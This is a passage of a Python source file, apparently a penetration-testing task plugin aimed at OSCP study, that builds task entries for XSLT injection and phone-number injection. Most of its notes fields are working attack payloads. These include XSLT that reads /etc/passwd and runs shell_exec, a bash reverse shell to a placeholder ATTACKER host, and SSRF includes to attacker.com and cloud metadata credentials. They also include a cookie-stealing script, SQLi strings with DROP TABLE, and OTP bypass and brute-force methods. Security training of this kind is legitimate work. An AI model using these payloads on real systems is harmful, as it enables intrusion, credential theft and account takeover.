PHP-specific (file_get_contents):
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>

File contents appear in transformed output.''',
                        'success_indicators': [
                            'File contents in response',
                            'Sensitive data revealed',
                            'Multiple files readable'
                        ],
                        'failure_indicators': [
                            'Function not supported',
                            'File access blocked',
                            'XSLT 1.0 only (no unparsed-text)'
                        ],
                        'alternatives': [
                            'Try XXE if XSLT blocked',
                            'Use SSRF to read files via HTTP',
                            'Look for PHP functions'
                        ],
                        'next_steps': [
                            'Extract config files',
                            'Read SSH keys',
                            'Escalate to RCE'
                        ]
                    }
                },
                {
                    'id': f'xslt-ssrf-{port}',
                    'name': 'XSLT SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Perform SSRF via XSLT include/import',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''XSLT SSRF:

Include external XSL:
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:include href="http://attacker.com/evil.xsl"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>

Import external XSL:
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:import href="http://127.0.0.1:8080/admin"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>

ESI injection + XSLT:
<esi:include src="http://internal.server/data.xml" stylesheet="http://attacker.com/evil.xsl">
</esi:include>

Scanning internal ports:
<xsl:value-of select="document('http://192.168.1.1:80')"/>
<xsl:value-of select="document('http://192.168.1.1:22')"/>
<xsl:value-of select="document('http://192.168.1.1:3306')"/>

Response differences indicate open/closed ports.

Access cloud metadata:
<xsl:include href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>

Read internal services:
<xsl:include href="http://localhost:6379/info"/>  (Redis)
<xsl:include href="http://localhost:27017/"/>     (MongoDB)

Setup listener to detect SSRF:
nc -lvnp 8080''',
                        'success_indicators': [
                            'HTTP request to attacker server',
                            'Internal service response',
                            'Cloud metadata retrieved'
                        ],
                        'failure_indicators': [
                            'External requests blocked',
                            'SSRF mitigations in place',
                            'No outbound connections'
                        ],
                        'alternatives': [
                            'Try XXE SSRF',
                            'Use other injection types',
                            'Look for direct SSRF vectors'
                        ],
                        'next_steps': [
                            'Scan internal network',
                            'Access internal services',
                            'Extract cloud credentials'
                        ]
                    }
                },
                {
                    'id': f'xslt-rce-php-{port}',
                    'name': 'XSLT RCE (PHP-specific)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute code via PHP XSLT functions',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''PHP XSLT RCE:

PHP provides php:function() in XSLT:

shell_exec:
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','id')" />
</xsl:template>
</xsl:stylesheet>

system:
<xsl:value-of select="php:function('system','whoami')" />

assert (complex payloads):
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />

file_get_contents + scandir:
<xsl:copy-of select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2]))==3')" />

Directory listing:
<xsl:value-of select="php:function('opendir','/var/www')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
...

Reverse shell:
<xsl:value-of select="php:function('shell_exec','bash -c \\'bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\'')" />

Call static class functions:
<xsl:value-of select="php:function('MyClass::myMethod','arg1')" />

Requirements:
- PHP with XSL extension
- php:function not disabled
- shell_exec/system not in disable_functions''',
                        'success_indicators': [
                            'Command output in response',
                            'Reverse shell established',
                            'Files listed/read'
                        ],
                        'failure_indicators': [
                            'php:function not available',
                            'shell_exec disabled',
                            'Output sanitized'
                        ],
                        'alternatives': [
                            'Try file write + webshell',
                            'Use SSRF to trigger other vulns',
                            'Look for other RCE vectors'
                        ],
                        'next_steps': [
                            'Establish reverse shell',
                            'Enumerate system',
                            'Escalate privileges'
                        ]
                    }
                },
                {
                    'id': f'xslt-javascript-{port}',
                    'name': 'XSLT JavaScript Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject JavaScript if XSLT output rendered in browser',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''XSLT to JavaScript injection:

If XSLT output rendered as HTML in browser:

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("XSS via XSLT");</script>
</xsl:template>
</xsl:stylesheet>

With HTML context:
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<script>alert(document.domain)</script>
</body>
</html>
</xsl:template>
</xsl:stylesheet>

Result:
Browser executes JavaScript in transformed HTML.

Use for:
- Cookie theft: <script>new Image().src='http://attacker.com/?c='+document.cookie</script>
- Session hijacking
- CSRF attacks
- Phishing

Requires XSLT output rendered in browser (not just server-side transform).''',
                        'success_indicators': [
                            'JavaScript executes',
                            'XSS confirmed',
                            'Session stolen'
                        ],
                        'failure_indicators': [
                            'Output not rendered in browser',
                            'CSP blocks execution',
                            'Output sanitized'
                        ],
                        'alternatives': [
                            'Try standard XSS',
                            'Focus on XSLT RCE',
                            'Use SSRF instead'
                        ],
                        'next_steps': [
                            'Steal cookies/tokens',
                            'Perform CSRF',
                            'Chain with other vulnerabilities'
                        ]
                    }
                }
            ]
        }

    def _create_phone_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """Phone Number Injection testing tasks"""
        return {
            'id': f'phone-injection-{port}',
            'name': 'Phone Number Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'phone-xss-sqli-{port}',
                    'name': 'Phone Number → XSS/SQLi',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject payloads in phone number fields',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': '''Phone number injection:

Add strings after phone number for injection attacks:

Format: +1234567890<PAYLOAD>

XSS:
+1234567890<script>alert(1)</script>
+1234567890'"><img src=x onerror=alert(1)>

SQLi:
+1234567890' OR '1'='1
+1234567890'; DROP TABLE users--

SSRF:
+1234567890http://attacker.com/log

Why this works:
- Phone validation often regex: ^\\+?[0-9]{10,15}$
- Additional chars may not be validated
- Backend may concatenate phone + suffix into query/output

Example vulnerable code:
query = f"SELECT * FROM users WHERE phone='{phone}'"
html = f"<div>Phone: {phone}</div>"

With payload: +123<script>alert(1)</script>
Result: <div>Phone: +123<script>alert(1)</script></div>

Use cases:
- XSS in admin panels displaying phone numbers
- SQLi in phone lookup queries
- SSRF in phone verification APIs
- Bypass rate limits (multiple numbers with same prefix)''',
                        'success_indicators': [
                            'XSS triggered from phone field',
                            'SQLi successful',
                            'Payload executed'
                        ],
                        'failure_indicators': [
                            'Phone strictly validated',
                            'Payloads stripped',
                            'No injection vectors'
                        ],
                        'alternatives': [
                            'Try other injection fields (name, email)',
                            'Test OTP bypass techniques',
                            'Look for rate limit bypass'
                        ],
                        'next_steps': [
                            'Exploit confirmed injection type',
                            'Test other phone-related features',
                            'Chain with authentication bypass'
                        ]
                    }
                },
                {
                    'id': f'phone-otp-bypass-{port}',
                    'name': 'Phone Number OTP Bypass/Bruteforce',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass OTP verification using phone number tricks',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Phone number OTP bypass:

Technique: Use same phone for multiple accounts
+1234567890
+1234567890,victim@email.com
+1234567890;victim@email.com

App may:
- Send OTP to +1234567890
- Create account for victim@email.com
- Allow attacker to use their OTP

Bypass methods:

1. Multiple separators:
+123,victim@email
+123;victim@email
+123%0avictim@email

2. Extension abuse:
+123ext999
+123x999
+123#999

3. Country code confusion:
+1234567890 (US)
+441234567890 (UK)
Same number, different codes

4. OTP reuse:
Request OTP for legitimate number
Use same OTP for victim number

5. Rate limit bypass:
+123-1
+123-2
+123-3
Each treated as different, but same phone

6. Null byte:
+123%00
+123\\x00

Brute-force OTP:
- 4-digit: 10,000 combinations
- 6-digit: 1,000,000 combinations
- If no rate limit: feasible

Tools:
- Burp Intruder
- Custom Python script
- OTP bruteforce tools''',
                        'success_indicators': [
                            'OTP bypass successful',
                            'Multiple accounts with one phone',
                            'Brute-force feasible'
                        ],
                        'failure_indicators': [
                            'Strong phone validation',
                            'Rate limiting effective',
                            'OTP unique per request'
                        ],
                        'alternatives': [
                            'Try response manipulation',
                            'Test CAPTCHA bypass',
                            'Look for session fixation'
                        ],
                        'next_steps': [
                            'Create multiple accounts',
                            'Account takeover via OTP',
                            'Bypass 2FA protection'
                        ]
                    }
                }
            ]
        }

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate on injection vulnerability detection"""
        from ..core.constants import FindingTypes
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect matches for specific injection types
        if finding_type == FindingTypes.SQL_INJECTION:
            logger.info("Injection attacks activating: SQLi detected")
            return 100

        if finding_type == FindingTypes.COMMAND_INJECTION:
            logger.info("Injection attacks activating: Command injection detected")
            return 100

        if finding_type in [FindingTypes.XSS_FOUND, FindingTypes.SSRF_FOUND,
                           FindingTypes.SSTI_FOUND, FindingTypes.XXE_FOUND]:
            logger.info(f"Injection attacks activating: {finding_type} detected")
            return 95

        # High - Generic injection keywords
        injection_keywords = ['injection', 'sqli', 'xss', 'ssrf', 'ssti', 'command injection', 'xxe']
        if any(keyword in description for keyword in injection_keywords):
            logger.info("Injection attacks activating: Injection keyword detected")
            return 85

        # Medium - Injection attack surface indicators
        if 'parameter' in description and any(kw in description for kw in ['injectable', 'vulnerable', 'unfiltered']):
            logger.info("Injection attacks activating: Injectable parameter detected")
            return 70

        return 0

